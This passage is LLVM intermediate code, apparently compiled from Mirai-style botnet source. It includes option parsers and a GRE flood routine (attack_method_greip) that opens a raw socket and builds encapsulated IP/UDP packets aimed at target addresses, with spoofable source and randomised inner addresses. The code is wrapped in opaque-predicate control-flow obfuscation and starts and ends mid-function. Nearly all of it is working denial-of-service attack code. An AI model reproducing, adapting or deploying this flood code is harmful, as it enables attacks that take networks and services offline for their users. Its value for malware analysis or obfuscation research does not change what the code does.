  br i1 %66, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %67

; <label>:67:                                     ; preds = %originalBBpart24
  %68 = load i32, i32* %10, align 4
  %69 = add nsw i32 %68, 1
  store i32 %69, i32* %10, align 4
  br label %11

; <label>:70:                                     ; preds = %originalBBpart2
  %71 = load i32, i32* @x.13
  %72 = load i32, i32* @y.14
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i8*, i8** %9, align 8
  store i8* %79, i8** %5, align 8
  %80 = load i32, i32* @x.13
  %81 = load i32, i32* @y.14
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %88

; <label>:88:                                     ; preds = %originalBBpart28, %43
  %89 = load i8*, i8** %5, align 8
  ret i8* %89

originalBBalteredBB:                              ; preds = %originalBB, %11
  %90 = load i32, i32* %10, align 4
  %91 = load i8, i8* %6, align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %90, %92
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %50
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %70
  %94 = load i8*, i8** %9, align 8
  store i8* %94, i8** %5, align 8
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %35

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* @x.15
  %19 = load i32, i32* @y.16
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i32, i32* %9, align 4
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* @x.15
  %28 = load i32, i32* @y.16
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:35:                                     ; preds = %4
  %36 = load i32, i32* @x.15
  %37 = load i32, i32* @y.16
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %35
  %44 = load i8*, i8** %10, align 8
  %45 = call i32 @util_atoi(i8* %44, i32 10)
  store i32 %45, i32* %5, align 4
  %46 = load i32, i32* @x.15
  %47 = load i32, i32* @y.16
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %54

; <label>:54:                                     ; preds = %originalBBpart24, %originalBBpart2
  %55 = load i32, i32* %5, align 4
  ret i32 %55

originalBBalteredBB:                              ; preds = %originalBB, %17
  %56 = load i32, i32* %9, align 4
  store i32 %56, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %35
  %57 = load i8*, i8** %10, align 8
  %58 = call i32 @util_atoi(i8* %57, i32 10)
  store i32 %58, i32* %5, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option*, i8 zeroext, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 zeroext %11, %struct.attack_option* %12, i8 zeroext %13, i8* null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

; <label>:17:                                     ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %38

; <label>:19:                                     ; preds = %4
  %20 = load i32, i32* @x.17
  %21 = load i32, i32* @y.18
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i8*, i8** %10, align 8
  %29 = call i32 @inet_addr(i8* %28) #6
  store i32 %29, i32* %5, align 4
  %30 = load i32, i32* @x.17
  %31 = load i32, i32* @y.18
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %38

; <label>:38:                                     ; preds = %originalBBpart2, %17
  %39 = load i32, i32* @x.17
  %40 = load i32, i32* @y.18
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %38
  %47 = load i32, i32* %5, align 4
  %48 = load i32, i32* @x.17
  %49 = load i32, i32* @y.18
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %47

originalBBalteredBB:                              ; preds = %originalBB, %19
  %56 = load i8*, i8** %10, align 8
  %57 = call i32 @inet_addr(i8* %56) #6
  store i32 %57, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %38
  %58 = load i32, i32* %5, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.grehdr*, align 8
  %29 = alloca %struct.iphdr*, align 8
  %30 = alloca %struct.udphdr*, align 8
  %31 = alloca i8*, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %33 = load i8, i8* %5, align 1
  %34 = zext i8 %33 to i64
  %35 = call noalias i8* @calloc(i64 %34, i64 8) #6
  %36 = bitcast i8* %35 to i8**
  store i8** %36, i8*** %11, align 8
  %37 = load i8, i8* %7, align 1
  %38 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %39 = call i32 @attack_get_opt_int(i8 zeroext %37, %struct.attack_option* %38, i8 zeroext 2, i32 0)
  %40 = trunc i32 %39 to i8
  store i8 %40, i8* %12, align 1
  %41 = load i8, i8* %7, align 1
  %42 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %43 = call i32 @attack_get_opt_int(i8 zeroext %41, %struct.attack_option* %42, i8 zeroext 3, i32 65535)
  %44 = trunc i32 %43 to i16
  store i16 %44, i16* %13, align 2
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 4, i32 64)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %14, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 5, i32 1)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %15, align 1
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 6, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %16, align 2
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 7, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %17, align 2
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 0, i32 512)
  store i32 %63, i32* %18, align 4
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 1, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %19, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 19, i32 0)
  %71 = trunc i32 %70 to i8
  store i8 %71, i8* %20, align 1
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = load i32, i32* @LOCAL_ADDR, align 4
  %75 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 25, i32 %74)
  store i32 %75, i32* %21, align 4
  %76 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %76, i32* %10, align 4
  %77 = icmp eq i32 %76, -1
  br i1 %77, label %78, label %95

; <label>:78:                                     ; preds = %4
  %79 = load i32, i32* @x.19
  %80 = load i32, i32* @y.20
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %78
  %87 = load i32, i32* @x.19
  %88 = load i32, i32* @y.20
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %609

; <label>:95:                                     ; preds = %4
  %96 = load i32, i32* @x.19
  %97 = load i32, i32* @y.20
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %95
  store i32 1, i32* %9, align 4
  %104 = load i32, i32* %10, align 4
  %105 = bitcast i32* %9 to i8*
  %106 = call i32 @setsockopt(i32 %104, i32 0, i32 3, i8* %105, i32 4) #6
  %107 = icmp eq i32 %106, -1
  %108 = load i32, i32* @x.19
  %109 = load i32, i32* @y.20
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %107, label %116, label %135

; <label>:116:                                    ; preds = %originalBBpart24
  %117 = load i32, i32* @x.19
  %118 = load i32, i32* @y.20
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %116
  %125 = load i32, i32* %10, align 4
  %126 = call i32 @close(i32 %125)
  %127 = load i32, i32* @x.19
  %128 = load i32, i32* @y.20
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %609

; <label>:135:                                    ; preds = %originalBBpart24
  store i32 0, i32* %9, align 4
  br label %136

; <label>:136:                                    ; preds = %originalBBpart260, %135
  %137 = load i32, i32* @x.19
  %138 = load i32, i32* @y.20
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %136
  %145 = load i32, i32* %9, align 4
  %146 = load i8, i8* %5, align 1
  %147 = zext i8 %146 to i32
  %148 = icmp slt i32 %145, %147
  %149 = load i32, i32* @x.19
  %150 = load i32, i32* @y.20
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %148, label %157, label %353

; <label>:157:                                    ; preds = %originalBBpart212
  %158 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %159 = load i8**, i8*** %11, align 8
  %160 = load i32, i32* %9, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds i8*, i8** %159, i64 %161
  store i8* %158, i8** %162, align 8
  %163 = load i8**, i8*** %11, align 8
  %164 = load i32, i32* %9, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds i8*, i8** %163, i64 %165
  %167 = load i8*, i8** %166, align 8
  %168 = bitcast i8* %167 to %struct.iphdr*
  store %struct.iphdr* %168, %struct.iphdr** %22, align 8
  %169 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i64 1
  %171 = bitcast %struct.iphdr* %170 to %struct.grehdr*
  store %struct.grehdr* %171, %struct.grehdr** %23, align 8
  %172 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %173 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %172, i64 1
  %174 = bitcast %struct.grehdr* %173 to %struct.iphdr*
  store %struct.iphdr* %174, %struct.iphdr** %24, align 8
  %175 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i64 1
  %177 = bitcast %struct.iphdr* %176 to %struct.udphdr*
  store %struct.udphdr* %177, %struct.udphdr** %25, align 8
  %178 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, 15
  %182 = or i8 %181, 64
  store i8 %182, i8* %179, align 4
  %183 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %184 = bitcast %struct.iphdr* %183 to i8*
  %185 = load i8, i8* %184, align 4
  %186 = and i8 %185, -16
  %187 = or i8 %186, 5
  store i8 %187, i8* %184, align 4
  %188 = load i8, i8* %12, align 1
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 1
  store i8 %188, i8* %190, align 1
  %191 = load i32, i32* %18, align 4
  %192 = sext i32 %191 to i64
  %193 = add i64 52, %192
  %194 = trunc i64 %193 to i16
  %195 = call zeroext i16 @htons(i16 zeroext %194) #7
  %196 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %197 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %196, i32 0, i32 2
  store i16 %195, i16* %197, align 2
  %198 = load i16, i16* %13, align 2
  %199 = call zeroext i16 @htons(i16 zeroext %198) #7
  %200 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %201 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %200, i32 0, i32 3
  store i16 %199, i16* %201, align 4
  %202 = load i8, i8* %14, align 1
  %203 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %204 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %203, i32 0, i32 5
  store i8 %202, i8* %204, align 4
  %205 = load i8, i8* %15, align 1
  %206 = icmp ne i8 %205, 0
  br i1 %206, label %207, label %211

; <label>:207:                                    ; preds = %157
  %208 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %209 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 4
  store i16 %208, i16* %210, align 2
  br label %211

; <label>:211:                                    ; preds = %207, %157
  %212 = load i32, i32* @x.19
  %213 = load i32, i32* @y.20
  %214 = sub i32 %212, 1
  %215 = mul i32 %212, %214
  %216 = urem i32 %215, 2
  %217 = icmp eq i32 %216, 0
  %218 = icmp slt i32 %213, 10
  %219 = or i1 %217, %218
  br i1 %219, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %211
  %220 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 6
  store i8 47, i8* %221, align 1
  %222 = load i32, i32* %21, align 4
  %223 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %224 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %223, i32 0, i32 8
  store i32 %222, i32* %224, align 4
  %225 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %226 = load i32, i32* %9, align 4
  %227 = sext i32 %226 to i64
  %228 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %225, i64 %227
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %228, i32 0, i32 1
  %230 = load i32, i32* %229, align 4
  %231 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 9
  store i32 %230, i32* %232, align 4
  %233 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %234 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %235 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %234, i32 0, i32 1
  store i16 %233, i16* %235, align 2
  %236 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %237 = bitcast %struct.iphdr* %236 to i8*
  %238 = load i8, i8* %237, align 4
  %239 = and i8 %238, 15
  %240 = or i8 %239, 64
  store i8 %240, i8* %237, align 4
  %241 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %242 = bitcast %struct.iphdr* %241 to i8*
  %243 = load i8, i8* %242, align 4
  %244 = and i8 %243, -16
  %245 = or i8 %244, 5
  store i8 %245, i8* %242, align 4
  %246 = load i8, i8* %12, align 1
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 1
  store i8 %246, i8* %248, align 1
  %249 = load i32, i32* %18, align 4
  %250 = sext i32 %249 to i64
  %251 = add i64 28, %250
  %252 = trunc i64 %251 to i16
  %253 = call zeroext i16 @htons(i16 zeroext %252) #7
  %254 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 2
  store i16 %253, i16* %255, align 2
  %256 = load i16, i16* %13, align 2
  %257 = zext i16 %256 to i32
  %258 = xor i32 %257, -1
  %259 = trunc i32 %258 to i16
  %260 = call zeroext i16 @htons(i16 zeroext %259) #7
  %261 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %262 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %261, i32 0, i32 3
  store i16 %260, i16* %262, align 4
  %263 = load i8, i8* %14, align 1
  %264 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %265 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %264, i32 0, i32 5
  store i8 %263, i8* %265, align 4
  %266 = load i8, i8* %15, align 1
  %267 = icmp ne i8 %266, 0
  %268 = load i32, i32* @x.19
  %269 = load i32, i32* @y.20
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart241, label %originalBB14alteredBB

originalBBpart241:                                ; preds = %originalBB14
  br i1 %267, label %276, label %296

; <label>:276:                                    ; preds = %originalBBpart241
  %277 = load i32, i32* @x.19
  %278 = load i32, i32* @y.20
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %276
  %285 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %286 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %287 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %286, i32 0, i32 4
  store i16 %285, i16* %287, align 2
  %288 = load i32, i32* @x.19
  %289 = load i32, i32* @y.20
  %290 = sub i32 %288, 1
  %291 = mul i32 %288, %290
  %292 = urem i32 %291, 2
  %293 = icmp eq i32 %292, 0
  %294 = icmp slt i32 %289, 10
  %295 = or i1 %293, %294
  br i1 %295, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %296

; <label>:296:                                    ; preds = %originalBBpart245, %originalBBpart241
  %297 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %298 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %297, i32 0, i32 6
  store i8 17, i8* %298, align 1
  %299 = call i32 @rand_next()
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %300, i32 0, i32 8
  store i32 %299, i32* %301, align 4
  %302 = load i8, i8* %20, align 1
  %303 = icmp ne i8 %302, 0
  br i1 %303, label %304, label %310

; <label>:304:                                    ; preds = %296
  %305 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %306 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %305, i32 0, i32 9
  %307 = load i32, i32* %306, align 4
  %308 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %309 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %308, i32 0, i32 9
  store i32 %307, i32* %309, align 4
  br label %318

; <label>:310:                                    ; preds = %296
  %311 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 8
  %313 = load i32, i32* %312, align 4
  %314 = sub i32 %313, 1024
  %315 = xor i32 %314, -1
  %316 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %317 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %316, i32 0, i32 9
  store i32 %315, i32* %317, align 4
  br label %318

; <label>:318:                                    ; preds = %310, %304
  %319 = load i16, i16* %16, align 2
  %320 = call zeroext i16 @htons(i16 zeroext %319) #7
  %321 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %322 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %321, i32 0, i32 0
  store i16 %320, i16* %322, align 2
  %323 = load i16, i16* %17, align 2
  %324 = call zeroext i16 @htons(i16 zeroext %323) #7
  %325 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %326 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %325, i32 0, i32 1
  store i16 %324, i16* %326, align 2
  %327 = load i32, i32* %18, align 4
  %328 = sext i32 %327 to i64
  %329 = add i64 8, %328
  %330 = trunc i64 %329 to i16
  %331 = call zeroext i16 @htons(i16 zeroext %330) #7
  %332 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 2
  store i16 %331, i16* %333, align 2
  br label %334

; <label>:334:                                    ; preds = %318
  %335 = load i32, i32* @x.19
  %336 = load i32, i32* @y.20
  %337 = sub i32 %335, 1
  %338 = mul i32 %335, %337
  %339 = urem i32 %338, 2
  %340 = icmp eq i32 %339, 0
  %341 = icmp slt i32 %336, 10
  %342 = or i1 %340, %341
  br i1 %342, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %334
  %343 = load i32, i32* %9, align 4
  %344 = add nsw i32 %343, 1
  store i32 %344, i32* %9, align 4
  %345 = load i32, i32* @x.19
  %346 = load i32, i32* @y.20
  %347 = sub i32 %345, 1
  %348 = mul i32 %345, %347
  %349 = urem i32 %348, 2
  %350 = icmp eq i32 %349, 0
  %351 = icmp slt i32 %346, 10
  %352 = or i1 %350, %351
  br i1 %352, label %originalBBpart260, label %originalBB47alteredBB

originalBBpart260:                                ; preds = %originalBB47
  br label %136

; <label>:353:                                    ; preds = %originalBBpart212
  br label %354

; <label>:354:                                    ; preds = %608, %353
  store i32 0, i32* %9, align 4
  br label %355

; <label>:355:                                    ; preds = %605, %354
  %356 = load i32, i32* %9, align 4
  %357 = load i8, i8* %5, align 1
  %358 = zext i8 %357 to i32
  %359 = icmp slt i32 %356, %358
  br i1 %359, label %360, label %608

; <label>:360:                                    ; preds = %355
  %361 = load i32, i32* @x.19
  %362 = load i32, i32* @y.20
  %363 = sub i32 %361, 1
  %364 = mul i32 %361, %363
  %365 = urem i32 %364, 2
  %366 = icmp eq i32 %365, 0
  %367 = icmp slt i32 %362, 10
  %368 = or i1 %366, %367
  br i1 %368, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %360
  %369 = load i8**, i8*** %11, align 8
  %370 = load i32, i32* %9, align 4
  %371 = sext i32 %370 to i64
  %372 = getelementptr inbounds i8*, i8** %369, i64 %371
  %373 = load i8*, i8** %372, align 8
  store i8* %373, i8** %26, align 8
  %374 = load i8*, i8** %26, align 8
  %375 = bitcast i8* %374 to %struct.iphdr*
  store %struct.iphdr* %375, %struct.iphdr** %27, align 8
  %376 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %377 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %376, i64 1
  %378 = bitcast %struct.iphdr* %377 to %struct.grehdr*
  store %struct.grehdr* %378, %struct.grehdr** %28, align 8
